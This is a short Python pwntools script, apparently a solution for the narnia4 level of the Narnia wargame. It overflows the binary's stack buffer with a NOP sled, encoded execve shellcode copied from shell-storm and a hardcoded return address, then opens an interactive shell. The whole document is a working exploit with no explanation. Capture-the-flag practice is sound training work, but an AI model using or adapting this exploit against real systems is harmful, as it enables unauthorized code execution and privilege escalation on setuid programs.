from pwn import *
elf = context.binary = ELF('/narnia/narnia4')
# http://shell-storm.org/shellcode/files/shellcode-607.html
shellcode = (
    b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80"
    b"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
    b"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
    b"\x6b\x0c\x59\x9a\x53\x67\x69\x2e"
    b"\x71\x8a\xe2\x53\x6b\x69\x69\x30"
    b"\x63\x62\x74\x69\x30\x63\x6a\x6f"
    b"\x8a\xe4\x53\x52\x54\x8a\xe2\xce"
    b"\x81"
)
ret = 0xffffd254
shellcode = shellcode.rjust(200,b"\x90")
payload = flat(
    shellcode,
    "\x90"*64,
    ret
)
p = process([elf.path,payload])
p.interactive()

